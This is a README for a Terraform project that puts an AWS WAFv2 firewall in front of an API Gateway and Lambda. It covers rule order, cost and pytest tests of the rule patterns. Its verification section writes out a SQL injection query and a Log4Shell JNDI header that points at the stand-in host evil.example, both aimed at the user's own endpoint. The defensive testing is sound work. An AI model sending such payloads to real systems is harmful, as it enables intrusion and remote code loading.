# Project 4 — AWS WAF: Web Application Firewall

[![AWS WAF](https://img.shields.io/badge/AWS-WAFv2-FF9900?style=flat-square&logo=amazon-aws&logoColor=white)](https://aws.amazon.com/waf/)
[![Terraform](https://img.shields.io/badge/Terraform-≥1.0-7B42BC?style=flat-square&logo=terraform&logoColor=white)](https://www.terraform.io/)
[![Tests](https://img.shields.io/badge/tests-33_passing-brightgreen?style=flat-square&logo=pytest&logoColor=white)](#tests)

WAFv2 web application firewall protecting an API Gateway HTTP API. Five layered rules block SQL injection, XSS, known exploit payloads (Log4Shell, SSRF), and volumetric attacks — all logged to CloudWatch.

Designed to be cost-effective: uses API Gateway instead of an Application Load Balancer (saves ~$18/month), and CloudWatch Logs instead of Kinesis Firehose for WAF logging.

---

## Architecture

```
Internet
    │
    ▼
WAFv2 WebACL (REGIONAL)
    │
    │  Rule evaluation order:
    │  1. AWSManagedRulesCommonRuleSet   — OWASP Top 10 baseline
    │  2. AWSManagedRulesSQLiRuleSet     — SQL injection
    │  3. AWSManagedRulesKnownBadInputs — Log4Shell, SSRF, path traversal
    │  4. RateLimitPerIP                 — 2000 req / 5 min per IP (block)
    │  5. BlockListedIPs                 — custom IP blocklist (initially empty)
    │
    ▼
API Gateway HTTP API  →  Lambda (app_handler.py)
    │
    ▼
CloudWatch Logs (aws-waf-logs-*)
```

Blocked requests never reach the Lambda function. All rule matches are recorded in the WAF log group with the matched rule name, IP, URI, and request headers.

---

## Rule Details

| Rule | Action | What It Catches |
|---|---|---|
| `AWSManagedRulesCommonRuleSet` | Block (count `NoUserAgent_HEADER`) | OWASP Top 10, common exploits |
| `AWSManagedRulesSQLiRuleSet` | Block | UNION SELECT, OR 1=1, DROP TABLE, xp_cmdshell |
| `AWSManagedRulesKnownBadInputsRuleSet` | Block | Log4Shell `${jndi:...}`, SSRF metadata endpoints, path traversal |
| `RateLimitPerIP` | Block | > 2000 requests per 5-minute window per IP |
| `BlockListedIPs` | Block | Custom IP set — populate via Terraform or AWS CLI as threats are identified |

`NoUserAgent_HEADER` is overridden to Count (not Block) because many legitimate automation tools omit the User-Agent header.

---

## Project Structure

```
4 - AWS_WAF/
├── terraform/
│   ├── main.tf          # Provider config, locals
│   ├── waf.tf           # WebACL, IP set, logging config, ACL association
│   ├── api_gateway.tf   # HTTP API, Lambda integration, routes, stage
│   ├── lambda.tf        # App Lambda function, log group
│   ├── iam.tf           # Lambda execution role
│   ├── variables.tf
│   ├── outputs.tf
│   └── data.tf
├── app/
│   └── app_handler.py   # Simple Lambda web app (the protected resource)
└── tests/
    └── test_waf_rules.py  # 33 pytest tests for rule pattern logic
```

---

## Deployment

### Prerequisites
- Terraform ≥ 1.0
- AWS CLI configured

```bash
cd "4 - AWS_WAF/terraform"
terraform init
terraform plan
terraform apply
```

Terraform outputs the API Gateway endpoint URL and WAF WebACL ARN. The WAF is automatically associated with the API Gateway stage on deploy.

### Key Variables

| Variable | Default | Description |
|---|---|---|
| `rate_limit_threshold` | `2000` | Max requests per IP per 5-minute window |
| `log_retention_days` | `14` | CloudWatch WAF log retention |
| `environment` | `dev` | Resource name prefix |

---

## Testing the WAF

### Verify blocking works

After deploying, test that the WAF blocks attack payloads:

```bash
API_URL=$(terraform output -raw api_endpoint)

# Should return 403 — SQL injection
curl -s -o /dev/null -w "%{http_code}" \
  "${API_URL}?id=1'+UNION+SELECT+username,password+FROM+users--"

# Should return 403 — Log4Shell
curl -s -o /dev/null -w "%{http_code}" \
  -H 'X-Api-Version: ${jndi:ldap://evil.example/a}' \
  "${API_URL}"

# Should return 200 — clean request
curl -s "${API_URL}"
```

### Inspect WAF logs

```bash
aws logs filter-log-events \
  --log-group-name "aws-waf-logs-waf-security-dev" \
  --filter-pattern '{ $.action = "BLOCK" }' \
  --query 'events[].message' \
  | python3 -m json.tool
```

### Add an IP to the blocklist

```bash
IP_SET_ID=$(terraform output -raw ip_set_arn | cut -d/ -f3)
# Use AWS CLI or update the addresses list in waf.tf and re-apply
```

---

## Tests

The WAF tests validate that the regex patterns modelling each managed rule group correctly identify attack payloads and pass clean inputs. Since WAF rules can't be unit-tested in CI without a deployed WebACL, these tests model rule logic as pure Python functions.

```bash
python -m pytest tests/test_waf_rules.py -v
# or from the repo root:
python -m pytest tests/ -k waf -v
```

33 tests covering:
- SQLi: UNION SELECT, OR 1=1, DROP TABLE, INSERT INTO, xp_cmdshell, and clean queries
- XSS: `<script>`, `javascript:`, event handlers (`onerror`, `onload`, `onclick`), `<iframe>`, and clean HTML
- Known bad inputs: Log4Shell variants, SSRF (AWS/GCP metadata endpoints), path traversal, LFI

---

## Cost

| Resource | Cost |
|---|---|
| WAFv2 WebACL | $5.00 / month |
| Managed rule groups (×3) | $1.00 each = $3.00 / month |
| Rate limit rule | Included in WebACL price |
| API Gateway (HTTP API) | $1.00 / million requests |
| Lambda | Free tier |
| CloudWatch Logs | ~$0.50 / GB ingested |
| **Total (demo volume)** | **~$8 / month** |

Compare to using an Application Load Balancer: ALB adds ~$16–22/month regardless of traffic. Using API Gateway keeps this project affordable to leave running.

Run `terraform destroy` to remove all resources and stop charges.
